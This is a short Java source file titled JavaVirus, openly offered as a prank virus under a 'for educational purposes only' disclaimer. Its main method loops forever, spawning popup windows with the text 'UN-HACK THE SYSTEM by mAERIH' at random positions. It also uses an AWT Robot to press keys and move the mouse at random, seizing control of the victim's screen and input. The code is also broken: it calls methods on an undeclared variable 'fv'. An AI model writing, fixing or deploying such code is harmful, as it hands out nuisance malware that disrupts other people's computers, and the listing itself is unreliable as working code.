//FOR EDUCATIONAL PURPOSES ONLY MAERI WONT BE LIABLE FOR ANY MISUSE OF THE TOOL.
import java.util.Random;
import javax.swing.JLabel;
import java.awt.event.KeyEvent;
import javax.swing.JWindow;
import java.awt.*;

public class JavaVirus {

    private final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    private final int height = (int)screenSize.getHeight();
    private final int width = (int)screenSize.getWidth();
    private final Random Random = new Random();

    public void BlockAll() throws AWTException
    {
        Robot robot = new Robot();
        robot.keyPress(KeyEvent.VK_COPY);
        robot.mouseMove(Random.nextInt(width), Random.nextInt(height));
    }

    public void Popup()
    {
        JWindow window = new JWindow();
        JLabel label = new JLabel("UN-HACK THE SYSTEM by mAERIH", JLabel.CENTER);
        label.setForeground(Color.red);
        window.add(label);
        window.setForeground(Color.red);
        window.getContentPane().setBackground(Color.yellow);
        window.setSize(300, 50);
        window.setLocation(Random.nextInt(width), Random.nextInt(height));
        window.setVisible(true);
    }
    public static void main(String[] args) throws AWTException, InterruptedException{
        while(true)
        {
            fv.Popup();
            fv.BlockAll();
        }
    }
}
